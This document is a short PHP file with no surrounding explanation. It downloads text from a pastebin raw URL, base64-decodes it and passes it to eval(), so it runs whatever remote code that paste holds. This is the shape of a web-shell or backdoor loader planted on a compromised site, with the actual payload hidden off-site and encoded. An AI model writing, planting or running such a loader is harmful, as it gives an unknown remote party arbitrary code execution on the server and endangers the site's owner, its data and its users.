<?php

$qwe = "http://pastebin.com/raw/nvZCFqKf";
$qwer  = file_get_contents($qwe); 
eval("?>".(base64_decode($qwer)));

?>